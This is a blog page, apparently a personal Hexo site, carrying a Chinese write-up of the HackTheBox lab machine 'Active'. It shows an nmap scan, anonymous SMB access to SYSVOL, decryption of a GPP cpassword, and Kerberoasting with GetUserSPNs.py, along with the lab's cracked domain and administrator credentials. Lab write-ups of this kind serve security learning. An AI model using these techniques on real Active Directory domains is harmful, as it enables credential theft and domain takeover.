@@ -1,0 +1,449 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Easy W-Active | X1NRI&#39;s trash</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="信息搜集扫端口是个域控
+PORT      STATE    SERVICE       VERSION
+25/tcp    open     smtp?
+|_smtp-commands: Couldn&#39;t establish connection on port 25
+53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 09:30:17Z)
+110/tcp   open     tcpwrapped
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+514/tcp   filtered shell
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+1151/tcp  filtered unizensus
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+49152/tcp open     msrpc         Microsoft Windows RPC
+49153/tcp open     msrpc         Microsoft Windows RPC
+49154/tcp open     msrpc         Microsoft Windows RPC
+49155/tcp open     msrpc         Microsoft Windows RPC
+49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open     msrpc         Microsoft Windows RPC
+49165/tcp open     msrpc         Microsoft Windows RPC
+50006/tcp filtered unknown
+Aggressive OS guesses: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (95%), Microsoft Windows XP SP3 (92%), VMware Player virtual NAT device (92%), Actiontec MI424WR-GEN3I WAP (90%), DD-WRT v24-sp2 (Linux 2.4.37) (90%), Linux 4.4 (88%), Linux 3.2 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=248 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-01-14T09:32:18
+|_  start_date: 2025-01-14T04:08:46
+
+
+再用enum4linux-ng枚举一波信息：
+根域服务器，域名 active.htb，FQDN DC.active.htb，操作系统可能是Windows 7、Windows Server 2008 R2；同时SMB允许匿名登录：
+
+入侵SMB匿名登录"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Easy W-Active"/>
+  <meta property="og:site_name" content="X1NRI&#39;s trash"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Easy W-Active</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><p>是个域控</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE    SERVICE       VERSION
+25/tcp    open     smtp?
+|_smtp-commands: Couldn't establish connection on port 25
+53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 09:30:17Z)
+110/tcp   open     tcpwrapped
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+514/tcp   filtered shell
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     tcpwrapped
+1151/tcp  filtered unizensus
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open     tcpwrapped
+49152/tcp open     msrpc         Microsoft Windows RPC
+49153/tcp open     msrpc         Microsoft Windows RPC
+49154/tcp open     msrpc         Microsoft Windows RPC
+49155/tcp open     msrpc         Microsoft Windows RPC
+49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open     msrpc         Microsoft Windows RPC
+49165/tcp open     msrpc         Microsoft Windows RPC
+50006/tcp filtered unknown
+Aggressive OS guesses: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (95%), Microsoft Windows XP SP3 (92%), VMware Player virtual NAT device (92%), Actiontec MI424WR-GEN3I WAP (90%), DD-WRT v24-sp2 (Linux 2.4.37) (90%), Linux 4.4 (88%), Linux 3.2 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=248 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-01-14T09:32:18
+|_  start_date: 2025-01-14T04:08:46
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再用enum4linux-ng枚举一波信息：</p>
+<p>根域服务器，域名 active.htb，FQDN DC.active.htb，操作系统可能是Windows 7、Windows Server 2008 R2；同时SMB允许匿名登录：</p>
+<p><img src="/Rxi134_FILE/a9c9c06009636a8e05e4bcfd916f09ed_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="SMB匿名登录"><a href="#SMB匿名登录" class="headerlink" title="SMB匿名登录"></a>SMB匿名登录</h2><p><img src="/Rxi134_FILE/b6edaf94e40f378b8a566c280cf4fc2b_MD5.jpeg"></p>
+<p>进去一看有个文件夹<br><img src="/Rxi134_FILE/ce622759720e5afff9bbeda21b3235d2_MD5.jpeg"></p>
+<p>递归下载下来<br><img src="/Rxi134_FILE/bb3d1633372d81890c39a3f78e60d6dd_MD5.jpeg"></p>
+<p>经过搜索是 SYSVOL&#x2F; 文件夹下的内容</p>
+<h2 id="解密SYSVOL组策略文件密码"><a href="#解密SYSVOL组策略文件密码" class="headerlink" title="解密SYSVOL组策略文件密码"></a>解密SYSVOL组策略文件密码</h2><blockquote>
+<p>GPP是Group Policy Preferences（组策略首选项）的缩写，这是一个组策略实施工具。通过该工具，网络管理员可以实现更多的网络管理，如驱动映射、添加计划任务、管理本地组和用户。其中最常用的功能就是远程创建本地账户。在创建过程中，会在目标主机传送一个Groups.xml文件。该文件中保存这创建的用户名和加密的密码。该加密的密码采用对称加密。</p>
+</blockquote>
+<p>在 <code>active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</code>文件下能提取到凭据信息：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">userName="active.htb\SVC_TGS"
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>GPP 的 AES 算法密钥是公开的，解密得到明文<br><img src="/Rxi134_FILE/bb934614fbaa51e93848b29562e6203f_MD5.jpeg"></p>
+<p>现在我们就有了一组域凭据：</p>
+<pre class="line-numbers language-none"><code class="language-none">active.htb\SVC_TGS : GPPstillStandingStrong2k18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h1 id="驻足"><a href="#驻足" class="headerlink" title="驻足"></a>驻足</h1><h2 id="尝试winrm（失败）"><a href="#尝试winrm（失败）" class="headerlink" title="尝试winrm（失败）"></a>尝试winrm（失败）</h2><p>如何拿到shell？首先想到 winrm ，但是5985和5986端口是过滤的</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE    SERVICE
+5985/tcp filtered wsman
+5986/tcp filtered wsmans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="继续枚举SMB"><a href="#继续枚举SMB" class="headerlink" title="继续枚举SMB"></a>继续枚举SMB</h2><p><img src="/Rxi134_FILE/8c4741c2e9c8080c7ad20debed0d2926_MD5.jpeg"><br>能够访问 <code>Users\</code> 文件夹了，但是其它目录都是不可写的，psexec肯定用不了</p>
+<p>没办法了，查看wp，发现 shell 确实拿不到，那没事了</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>连shell都没有，只有一组域凭据🤔，那可用的攻击手法就很少了</p>
+<h2 id="Kerberosasting"><a href="#Kerberosasting" class="headerlink" title="Kerberosasting"></a>Kerberosasting</h2><p>先查询SPN</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GetUserSPNs.py <span class="token string">'active.htb/SVC_TGS:GPPstillStandingStrong2k18'</span> -dc-ip <span class="token number">10.10</span>.10.100  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/02c246f7fd24736427a17f524e234c15_MD5.jpeg"><br>可以看到administrator用户下注册了对整个域的cifs服务</p>
+<p>那主线就很明确了，申请ST然后破解服务哈希</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GetUserSPNs.py <span class="token string">'active.htb/SVC_TGS:GPPstillStandingStrong2k18'</span> -dc-ip <span class="token number">10.10</span>.10.100 -request-user Adminisrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/9a6c3381ca543a1522b0aaeb15207a8f_MD5.jpeg"></p>
+<p>3s 不到破解出来<br><img src="/Rxi134_FILE/32e83e1b204814ffab477b7e3ae00681_MD5.jpeg"></p>
+<p>现在便有了域管凭据<code>active.htb\administrator:Ticketmaster1968</code></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2025/01/14/12.%20Easy%20W-Active/" class="leancloud-visitors view" data-flag-title="Easy W-Active">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/01/13/9. Easy L-UnderPass-S6排位赛/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-01-14 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pentest/">pentest<span>14</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/靶场/">靶场<span>9</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%AB%E7%AB%AF%E5%8F%A3"><span class="toc-article-text">扫端口</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SMB%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-article-text">SMB匿名登录</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%A7%A3%E5%AF%86SYSVOL%E7%BB%84%E7%AD%96%E7%95%A5%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81"><span class="toc-article-text">解密SYSVOL组策略文件密码</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E9%A9%BB%E8%B6%B3"><span class="toc-article-text">驻足</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95winrm%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">尝试winrm（失败）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%A7%E7%BB%AD%E6%9E%9A%E4%B8%BESMB"><span class="toc-article-text">继续枚举SMB</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-article-text">提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Kerberosasting"><span class="toc-article-text">Kerberosasting</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
